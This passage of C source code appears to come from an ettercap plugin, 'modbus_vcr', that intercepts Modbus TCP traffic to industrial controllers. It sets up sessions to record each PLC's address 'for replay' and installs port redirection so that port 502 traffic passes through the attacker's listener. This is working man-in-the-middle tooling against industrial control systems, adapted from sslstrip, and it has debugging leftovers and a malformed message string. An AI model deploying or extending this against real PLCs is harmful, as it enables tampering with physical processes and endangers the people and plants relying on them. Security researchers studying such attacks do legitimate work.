    // if it's a SYN packet, we need to set up a new session...
    //po->flags |= PO_DROPPED;  // NO, we don't want to drop the damn thing!
    if ((po->flags & PO_FORWARDABLE) &&
        (po->L4.flags & TH_SYN) &&
        !(po->L4.flags & TH_ACK)){
//#ifndef OS_LINUX // linux doesn't need session mgmt? I don't get this...
			// sslstrip doesn't use session management in linux, but I think that
			// we will *always* want to use session management...because our session
			// does a lot more.
			// exfil sez that sslstrip doesn't use session management for linux since
			// it has other ways of finding original dest ip, but with this plugin
			// we're doing more with sessions than just tracking IP addresses -- we're
			// tracking our mitm state for replay!
			printf("modbus_vcr: Going to create a session structure...\n");
            struct ec_session *s = NULL;
            modbus_vcr_create_session(&s, PACKET);
			printf("modbus_vcr: Populating session\n");
			// We store the PLC IP address in the session data...
            memcpy(((session_data_t*) s->data)->plc_ip_addr, &po->L3.dst, sizeof(struct ip_addr));
			printf("modbus_vcr: placing session onto global session manager\n");
            session_put(s); // puts new session on global session manager
//#endif
        } else {
			printf("record_modbus: unforwardable or non-syn/non-ack packet detected, handling\n");
			if (po->flags & PO_FORWARDABLE){
				// forwardable packet, let's deal with it
				modbus_handle_request(PACKET);
			}else{
				// not forwardable, not a synpacket, we ignore the stream?
	            po->flags |= PO_IGNORE;
			}
        }
	// if it's not a SYN packet, we need to deal with the actual packet data...
	// we won't get called for these types of packets?
	
	
	

}

/* Modbus listen thread.  Mostly copied from sslstrip 
 * This will accept incoming connections on TCP/502 */

static int modbus_bind_wrapper(void){
	bind_port = EC_MAGIC_16; // high port that ettercap uses for binding first service
	struct sockaddr_in sa_in;
	ec_thread_init();
	DEBUG_MSG("modbus_listen_thread: initialized and ready");
	printf("modbus_listen_thread: initialized and ready\n");
	main_fd = socket(AF_INET, SOCK_STREAM, 0);
	memset(&sa_in, 0, sizeof(sa_in));
	sa_in.sin_family = AF_INET;
	sa_in.sin_addr.s_addr = INADDR_ANY;
	do {
		bind_port++;
		sa_in.sin_port = htons(bind_port);
	} while (bind(main_fd, (struct sockaddr *)&sa_in, sizeof(sa_in)) != 0);
	printf("successfully bound to port %d\n", bind_port);
	listen(main_fd, 100);
	USER_MSG("modbus_vcr plugin: bind 502 on %d\n, bind_port", bind_port);
	printf("about to set up redirect\n");
	if (modbus_insert_redirect(bind_port) != E_SUCCESS)
		return -E_FATAL;
	return E_SUCCESS;
}

static int modbus_insert_redirect(u_int16 dport){
	char asc_dport[16];
	int ret_val, i=0;
	char *command, *p;
	char **param = NULL;
	printf("modbus_insert_redirect() called with %d\n", dport);
	if (GBL_CONF->redir_command_on == NULL){
		printf("modbus_insert_redirect() no redirect command found!\n");
		return -E_FATAL;
	}
		
	snprintf(asc_dport, 16, "%u", dport);
	command = strdup(GBL_CONF->redir_command_on);
	str_replace(&command, "%iface", GBL_OPTIONS->iface);
	str_replace(&command, "%port", "502");
	str_replace(&command, "%rport", asc_dport);
#if defined(OS_DARWIN) || defined(OS_BSD)
	str_replace(&command, "%set", 21); // ??? sslstripset is 21, need to lookup what this does
#endif
	DEBUG_MSG("modbus_insert_redirect: [%s]", command);
	printf("modbus_insert_redirect: [%s]\n", command);
	for (p=strsep(&command, " "); p != NULL; p = strsep(&command, " ")){
		SAFE_REALLOC(param, (i+1) * sizeof(char *));
		param[i++] = strdup(p);
	}
	
	SAFE_REALLOC(param, (i+1) * sizeof(char *));
	param[i] = NULL;
	switch(fork()){
		case 0:
			execvp(param[0], param);
			exit(E_INVALID);
		case -1:
			SAFE_FREE(param);
			return -E_INVALID;
		default:
			SAFE_FREE(param);
			wait(&ret_val);
			if (ret_val == E_INVALID)
				return -E_INVALID;
	}
	return E_SUCCESS;
}

static int modbus_remove_redirect(u_int16 dport){
	char asc_dport[16];
	int ret_val, i=0;
	char *command, *p;
	char **param = NULL;
	if (GBL_CONF->redir_command_on == NULL)
		return -E_FATAL;
	snprintf(asc_dport, 16, "%u", dport);
	command = strdup(GBL_CONF->redir_command_off);
	str_replace(&command, "%iface", GBL_OPTIONS->iface);
	str_replace(&command, "%port", "502");
	str_replace(&command, "%rport", asc_dport);
#if defined(OS_DARWIN) || defined(OS_BSD)
	str_replace(&command, "%set", 21); // ??? sslstripset is 21, need to lookup what this does
#endif
	DEBUG_MSG("modbus_remove_redirect: [%s]", command);
	for (p=strsep(&command, " "); p != NULL; p = strsep(&command, " ")){
		SAFE_REALLOC(param, (i+1) * sizeof(char *));
		param[i++] = strdup(p);
	}
	
	SAFE_REALLOC(param, (i+1) * sizeof(char *));
	param[i] = NULL;
	switch(fork()){
		case 0:
			execvp(param[0], param);
			exit(E_INVALID);
		case -1:
			SAFE_FREE(param);
			return -E_INVALID;
		default:
			SAFE_FREE(param);
			wait(&ret_val);
			if (ret_val == E_INVALID)
				return -E_INVALID;
	}
	return E_SUCCESS;
}
